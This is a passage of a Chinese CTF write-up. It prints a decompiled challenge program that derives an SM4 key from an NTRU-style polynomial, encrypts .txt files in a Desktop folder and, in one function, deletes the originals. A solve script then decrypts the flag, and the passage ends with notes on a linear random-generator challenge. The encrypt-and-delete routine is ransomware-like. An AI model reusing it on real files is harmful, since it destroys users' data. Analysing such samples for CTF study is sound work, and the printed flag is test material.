        f<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>h<span class="token punctuation">)</span><span class="token punctuation">)</span>
    m <span class="token operator">=</span> generate_message<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"priv_key.txt"</span><span class="token punctuation">,</span> <span class="token string">"w"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
        f<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span>
    e <span class="token operator">=</span> encrypt_message<span class="token punctuation">(</span>m<span class="token punctuation">,</span> h<span class="token punctuation">)</span>
    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"enc.txt"</span><span class="token punctuation">,</span> <span class="token string">"w"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
        f<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">terms</span><span class="token punctuation">(</span>poly_str<span class="token punctuation">)</span><span class="token punctuation">:</span>
    terms <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
    pattern <span class="token operator">=</span> <span class="token string">r'([+-]?\s*x\^?\d*|[-+]?\s*\d+)'</span>
    matches <span class="token operator">=</span> re<span class="token punctuation">.</span>finditer<span class="token punctuation">(</span>pattern<span class="token punctuation">,</span> poly_str<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

    <span class="token keyword">for</span> <span class="token keyword">match</span> <span class="token keyword">in</span> matches<span class="token punctuation">:</span>
        term <span class="token operator">=</span> <span class="token keyword">match</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> term <span class="token operator">==</span> <span class="token string">'+x'</span> <span class="token keyword">or</span> term <span class="token operator">==</span> <span class="token string">'x'</span><span class="token punctuation">:</span>
            terms<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
        <span class="token keyword">elif</span> term <span class="token operator">==</span> <span class="token string">'-x'</span><span class="token punctuation">:</span>
            terms<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>
        <span class="token keyword">elif</span> <span class="token string">'x^'</span> <span class="token keyword">in</span> term<span class="token punctuation">:</span>
            coeff_part <span class="token operator">=</span> term<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'x^'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
            exponent <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>term<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'x^'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
            <span class="token keyword">if</span> <span class="token keyword">not</span> coeff_part <span class="token keyword">or</span> coeff_part <span class="token operator">==</span> <span class="token string">'+'</span><span class="token punctuation">:</span>
                coeff <span class="token operator">=</span> <span class="token number">1</span>
            <span class="token keyword">elif</span> coeff_part <span class="token operator">==</span> <span class="token string">'-'</span><span class="token punctuation">:</span>
                coeff <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span>
            <span class="token keyword">else</span><span class="token punctuation">:</span>
                coeff <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>coeff_part<span class="token punctuation">)</span>
            terms<span class="token punctuation">.</span>append<span class="token punctuation">(</span>coeff <span class="token operator">*</span> exponent<span class="token punctuation">)</span>
        <span class="token keyword">elif</span> <span class="token string">'x'</span> <span class="token keyword">in</span> term<span class="token punctuation">:</span>
            coeff_part <span class="token operator">=</span> term<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'x'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
            <span class="token keyword">if</span> <span class="token keyword">not</span> coeff_part <span class="token keyword">or</span> coeff_part <span class="token operator">==</span> <span class="token string">'+'</span><span class="token punctuation">:</span>
                terms<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
            <span class="token keyword">elif</span> coeff_part <span class="token operator">==</span> <span class="token string">'-'</span><span class="token punctuation">:</span>
                terms<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>
            <span class="token keyword">else</span><span class="token punctuation">:</span>
                terms<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>coeff_part<span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            <span class="token keyword">if</span> term <span class="token operator">==</span> <span class="token string">'+1'</span> <span class="token keyword">or</span> term <span class="token operator">==</span> <span class="token string">'1'</span><span class="token punctuation">:</span>
                terms<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
                terms<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> terms

<span class="token keyword">def</span> <span class="token function">gen_key</span><span class="token punctuation">(</span>poly_terms<span class="token punctuation">)</span><span class="token punctuation">:</span>
    binary <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token number">128</span>
    <span class="token keyword">for</span> term <span class="token keyword">in</span> poly_terms<span class="token punctuation">:</span>
        exponent <span class="token operator">=</span> <span class="token builtin">abs</span><span class="token punctuation">(</span>term<span class="token punctuation">)</span>
        <span class="token keyword">if</span> term <span class="token operator">></span> <span class="token number">0</span> <span class="token keyword">and</span> exponent <span class="token operator">&lt;=</span> <span class="token number">127</span><span class="token punctuation">:</span>  
            binary<span class="token punctuation">[</span><span class="token number">127</span> <span class="token operator">-</span> exponent<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span>
    binary_str <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token builtin">map</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">,</span> binary<span class="token punctuation">)</span><span class="token punctuation">)</span>
    hex_key <span class="token operator">=</span> <span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>binary_str<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>upper<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>zfill<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> hex_key

<span class="token keyword">def</span> <span class="token function">read_polynomial_from_file</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>filename<span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token builtin">file</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token builtin">file</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">sm4_encrypt</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span> plaintext<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">assert</span> <span class="token builtin">len</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">16</span><span class="token punctuation">,</span> <span class="token string">"SM4 key must be 16 bytes"</span>
    cipher <span class="token operator">=</span> sm4<span class="token punctuation">.</span>CryptSM4<span class="token punctuation">(</span><span class="token punctuation">)</span>
    cipher<span class="token punctuation">.</span>set_key<span class="token punctuation">(</span>key<span class="token punctuation">,</span> sm4<span class="token punctuation">.</span>SM4_ENCRYPT<span class="token punctuation">)</span>
    padded_plaintext <span class="token operator">=</span> pad<span class="token punctuation">(</span>plaintext<span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> cipher<span class="token punctuation">.</span>crypt_ecb<span class="token punctuation">(</span>padded_plaintext<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">sm4_encrypt_file</span><span class="token punctuation">(</span>input_path<span class="token punctuation">,</span> output_path<span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>input_path<span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
        plaintext <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
    
    ciphertext <span class="token operator">=</span> sm4_encrypt<span class="token punctuation">(</span>key<span class="token punctuation">,</span> plaintext<span class="token punctuation">)</span>
    
    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>output_path<span class="token punctuation">,</span> <span class="token string">'wb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
        f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>ciphertext<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">resource_path</span><span class="token punctuation">(</span>relative_path<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> <span class="token builtin">getattr</span><span class="token punctuation">(</span>sys<span class="token punctuation">,</span> <span class="token string">'frozen'</span><span class="token punctuation">,</span> <span class="token boolean">False</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        base_path <span class="token operator">=</span> sys<span class="token punctuation">.</span>_MEIPASS
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        base_path <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>abspath<span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>base_path<span class="token punctuation">,</span> relative_path<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">encrypt_directory</span><span class="token punctuation">(</span>directory<span class="token punctuation">,</span> sm4_key<span class="token punctuation">,</span> extensions<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">".txt"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> <span class="token keyword">not</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>exists<span class="token punctuation">(</span>directory<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Directory does not exist: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>directory<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
        <span class="token keyword">return</span>
    
    <span class="token keyword">for</span> root<span class="token punctuation">,</span> _<span class="token punctuation">,</span> files <span class="token keyword">in</span> os<span class="token punctuation">.</span>walk<span class="token punctuation">(</span>directory<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">for</span> <span class="token builtin">file</span> <span class="token keyword">in</span> files<span class="token punctuation">:</span>
            <span class="token keyword">if</span> <span class="token builtin">any</span><span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">.</span>endswith<span class="token punctuation">(</span>ext<span class="token punctuation">)</span> <span class="token keyword">for</span> ext <span class="token keyword">in</span> extensions<span class="token punctuation">)</span><span class="token punctuation">:</span>
                input_path <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>root<span class="token punctuation">,</span> <span class="token builtin">file</span><span class="token punctuation">)</span>
                output_path <span class="token operator">=</span> input_path <span class="token operator">+</span> <span class="token string">".enc"</span>
                
                <span class="token keyword">try</span><span class="token punctuation">:</span>
                    sm4_encrypt_file<span class="token punctuation">(</span>input_path<span class="token punctuation">,</span> output_path<span class="token punctuation">,</span> sm4_key<span class="token punctuation">)</span>
                    os<span class="token punctuation">.</span>remove<span class="token punctuation">(</span>input_path<span class="token punctuation">)</span>
                    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Encrypted: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>input_path<span class="token punctuation">&#125;</span></span><span class="token string"> -> </span><span class="token interpolation"><span class="token punctuation">&#123;</span>output_path<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
                <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
                    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Error encrypting </span><span class="token interpolation"><span class="token punctuation">&#123;</span>input_path<span class="token punctuation">&#125;</span></span><span class="token string">: </span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">str</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        save_ntru_keys<span class="token punctuation">(</span><span class="token punctuation">)</span>
        poly_str <span class="token operator">=</span> read_polynomial_from_file<span class="token punctuation">(</span><span class="token string">"priv_key.txt"</span><span class="token punctuation">)</span>
        poly_terms <span class="token operator">=</span> terms<span class="token punctuation">(</span>poly_str<span class="token punctuation">)</span>
        sm4_key <span class="token operator">=</span> binascii<span class="token punctuation">.</span>unhexlify<span class="token punctuation">(</span>poly_terms<span class="token punctuation">)</span>
        user_name <span class="token operator">=</span> os<span class="token punctuation">.</span>getlogin<span class="token punctuation">(</span><span class="token punctuation">)</span>
        target_dir <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token string">"C:\Users"</span><span class="token punctuation">,</span> user_name<span class="token punctuation">,</span> <span class="token string">"Desktop"</span><span class="token punctuation">,</span> <span class="token string">"test_files"</span><span class="token punctuation">)</span>
        
        <span class="token keyword">if</span> <span class="token keyword">not</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>exists<span class="token punctuation">(</span>target_dir<span class="token punctuation">)</span><span class="token punctuation">:</span>
            os<span class="token punctuation">.</span>makedirs<span class="token punctuation">(</span>target_dir<span class="token punctuation">,</span> exist_ok<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Created directory: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>target_dir<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
            <span class="token keyword">return</span>
            
        txt_files <span class="token operator">=</span> <span class="token punctuation">[</span>f <span class="token keyword">for</span> f <span class="token keyword">in</span> os<span class="token punctuation">.</span>listdir<span class="token punctuation">(</span>target_dir<span class="token punctuation">)</span> 
                    <span class="token keyword">if</span> f<span class="token punctuation">.</span>endswith<span class="token punctuation">(</span><span class="token string">'.txt'</span><span class="token punctuation">)</span> <span class="token keyword">and</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>isfile<span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>target_dir<span class="token punctuation">,</span> f<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
        
        <span class="token keyword">if</span> <span class="token keyword">not</span> txt_files<span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"No .txt files found in directory"</span><span class="token punctuation">)</span>
            <span class="token keyword">return</span>
            
        <span class="token keyword">for</span> txt_file <span class="token keyword">in</span> txt_files<span class="token punctuation">:</span>
            file_path <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>target_dir<span class="token punctuation">,</span> txt_file<span class="token punctuation">)</span>
            <span class="token keyword">try</span><span class="token punctuation">:</span>
                <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>file_path<span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
                    test_data <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
                
                ciphertext <span class="token operator">=</span> sm4_encrypt<span class="token punctuation">(</span>sm4_key<span class="token punctuation">,</span> test_data<span class="token punctuation">)</span>
                encrypted_path <span class="token operator">=</span> file_path <span class="token operator">+</span> <span class="token string">'.enc'</span>
                
                <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>encrypted_path<span class="token punctuation">,</span> <span class="token string">'wb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
                    f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>ciphertext<span class="token punctuation">)</span>
            <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Error processing </span><span class="token interpolation"><span class="token punctuation">&#123;</span>txt_file<span class="token punctuation">&#125;</span></span><span class="token string">: </span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">str</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
                
    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Fatal error: </span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">str</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
    main<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>

<p>发现将是多项式m转换为SM4密钥加密，p，d&#x3D;3本来应该对enc多项式取模获得m，但是发现反编译出的文件有enc.txt和pub_key.txt，其中enc.txt里有两个多项式，使用第二个居然可以直接解密。</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> gmssl <span class="token keyword">import</span> sm4
<span class="token keyword">import</span> binascii
<span class="token keyword">import</span> re

<span class="token keyword">def</span> <span class="token function">terms</span><span class="token punctuation">(</span>poly_str<span class="token punctuation">)</span><span class="token punctuation">:</span>
    terms <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
    pattern <span class="token operator">=</span> <span class="token string">r'([+-]?\s*x\^?\d*|[-+]?\s*\d+)'</span>
    matches <span class="token operator">=</span> re<span class="token punctuation">.</span>finditer<span class="token punctuation">(</span>pattern<span class="token punctuation">,</span> poly_str<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    
    <span class="token keyword">for</span> <span class="token keyword">match</span> <span class="token keyword">in</span> matches<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token keyword">match</span><span class="token punctuation">)</span>
        term <span class="token operator">=</span> <span class="token keyword">match</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> term <span class="token operator">==</span> <span class="token string">'+x'</span> <span class="token keyword">or</span> term <span class="token operator">==</span> <span class="token string">'x'</span><span class="token punctuation">:</span>
            terms<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
        <span class="token keyword">elif</span> term <span class="token operator">==</span> <span class="token string">'-x'</span><span class="token punctuation">:</span>
            terms<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>
        <span class="token keyword">elif</span> <span class="token string">'x^'</span> <span class="token keyword">in</span> term<span class="token punctuation">:</span>
            coeff_part <span class="token operator">=</span> term<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'x^'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
            exponent <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>term<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'x^'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
            <span class="token keyword">if</span> <span class="token keyword">not</span> coeff_part <span class="token keyword">or</span> coeff_part <span class="token operator">==</span> <span class="token string">'+'</span><span class="token punctuation">:</span>
                coeff <span class="token operator">=</span> <span class="token number">1</span>
            <span class="token keyword">elif</span> coeff_part <span class="token operator">==</span> <span class="token string">'-'</span><span class="token punctuation">:</span>
                coeff <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span>
            <span class="token keyword">else</span><span class="token punctuation">:</span>
                coeff <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>coeff_part<span class="token punctuation">)</span>
            terms<span class="token punctuation">.</span>append<span class="token punctuation">(</span>coeff <span class="token operator">*</span> exponent<span class="token punctuation">)</span>
        <span class="token keyword">elif</span> <span class="token string">'x'</span> <span class="token keyword">in</span> term<span class="token punctuation">:</span>
            coeff_part <span class="token operator">=</span> term<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'x'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
            <span class="token keyword">if</span> <span class="token keyword">not</span> coeff_part <span class="token keyword">or</span> coeff_part <span class="token operator">==</span> <span class="token string">'+'</span><span class="token punctuation">:</span>
                terms<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
            <span class="token keyword">elif</span> coeff_part <span class="token operator">==</span> <span class="token string">'-'</span><span class="token punctuation">:</span>
                terms<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>
            <span class="token keyword">else</span><span class="token punctuation">:</span>
                terms<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>coeff_part<span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            <span class="token keyword">if</span> term <span class="token operator">==</span> <span class="token string">'+1'</span> <span class="token keyword">or</span> term <span class="token operator">==</span> <span class="token string">'1'</span><span class="token punctuation">:</span>
                terms<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
                terms<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">0</span><span class="token punctuation">)</span>
    
    <span class="token keyword">return</span> terms

<span class="token comment"># 解密函数</span>
<span class="token keyword">def</span> <span class="token function">sm4_decrypt</span><span class="token punctuation">(</span>key_hex<span class="token punctuation">,</span> ciphertext_hex<span class="token punctuation">)</span><span class="token punctuation">:</span>
    key <span class="token operator">=</span> binascii<span class="token punctuation">.</span>unhexlify<span class="token punctuation">(</span>key_hex<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">)</span>
    cipher <span class="token operator">=</span> sm4<span class="token punctuation">.</span>CryptSM4<span class="token punctuation">(</span><span class="token punctuation">)</span>
    cipher<span class="token punctuation">.</span>set_key<span class="token punctuation">(</span>key<span class="token punctuation">,</span> sm4<span class="token punctuation">.</span>SM4_DECRYPT<span class="token punctuation">)</span>
    ciphertext <span class="token operator">=</span> binascii<span class="token punctuation">.</span>unhexlify<span class="token punctuation">(</span>ciphertext_hex<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>ciphertext<span class="token punctuation">)</span>
    plaintext <span class="token operator">=</span> cipher<span class="token punctuation">.</span>crypt_ecb<span class="token punctuation">(</span>ciphertext<span class="token punctuation">)</span>
    <span class="token keyword">return</span> plaintext

<span class="token keyword">def</span> <span class="token function">sm4_encrypt</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span> plaintext<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">assert</span> <span class="token builtin">len</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">16</span><span class="token punctuation">,</span> <span class="token string">"SM4 key must be 16 bytes"</span>
    cipher <span class="token operator">=</span> sm4<span class="token punctuation">.</span>CryptSM4<span class="token punctuation">(</span><span class="token punctuation">)</span>
    cipher<span class="token punctuation">.</span>set_key<span class="token punctuation">(</span>key<span class="token punctuation">,</span> sm4<span class="token punctuation">.</span>SM4_ENCRYPT<span class="token punctuation">)</span>
    padded_plaintext <span class="token operator">=</span> pad<span class="token punctuation">(</span>plaintext<span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> cipher<span class="token punctuation">.</span>crypt_ecb<span class="token punctuation">(</span>padded_plaintext<span class="token punctuation">)</span>


m<span class="token operator">=</span><span class="token string">"-x^48 - x^46 + x^45 + x^43 - x^42 + x^41 + x^40 + x^36 - x^35 + x^34 - x^33 + x^32 - x^30 + x^29 - x^28 - x^27 - x^26 - x^25 - x^23 - x^22 + x^21 + x^20 + x^19 + x^18 - x^17 - x^16 - x^15 - x^14 - x^12 + x^9 - x^7 - x^6 - x^5 - x^4 + x^3 - x + 1"</span>
m_ <span class="token operator">=</span> terms<span class="token punctuation">(</span>m<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>m_<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">gen_key</span><span class="token punctuation">(</span>poly_terms<span class="token punctuation">)</span><span class="token punctuation">:</span>
    binary <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token number">128</span>
    <span class="token keyword">for</span> term <span class="token keyword">in</span> poly_terms<span class="token punctuation">:</span>
        exponent <span class="token operator">=</span> <span class="token builtin">abs</span><span class="token punctuation">(</span>term<span class="token punctuation">)</span>
        <span class="token keyword">if</span> term <span class="token operator">></span> <span class="token number">0</span> <span class="token keyword">and</span> exponent <span class="token operator">&lt;=</span> <span class="token number">127</span><span class="token punctuation">:</span>  
            binary<span class="token punctuation">[</span><span class="token number">127</span> <span class="token operator">-</span> exponent<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span>
    binary_str <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token builtin">map</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">,</span> binary<span class="token punctuation">)</span><span class="token punctuation">)</span>
    hex_key <span class="token operator">=</span> <span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>binary_str<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>upper<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>zfill<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> hex_key

hex_key <span class="token operator">=</span> gen_key<span class="token punctuation">(</span>m_<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>hex_key<span class="token punctuation">)</span>

encrypted_flag <span class="token operator">=</span> <span class="token string">"bf0cb5cc6bea6146e9c1f109df953a57daa416d38a8ffba6438e7e599613e01f3b9a53dace4ccd55cd3e55ef88e0b835"</span>
flag <span class="token operator">=</span> sm4_decrypt<span class="token punctuation">(</span>hex_key<span class="token punctuation">,</span> encrypted_flag<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Decrypted Flag:"</span><span class="token punctuation">,</span> flag<span class="token punctuation">)</span></code></pre>

<p>XYCTF{Crypto0_can_n0t_So1ve_it}</p>
<h3 id="reed"><a href="#reed" class="headerlink" title="reed"></a>reed</h3><p>题目给出一个基于random的随机数生成器</p>
<p>但是观察密文前两组是一样的，是同一个字符，根据出题人给出的其他参数，推测flag前几位是114514</p>
<p>有两个不一样的m即可两组enc相减乘m差值的逆元获得a，即可获得a，b。解密即可</p>
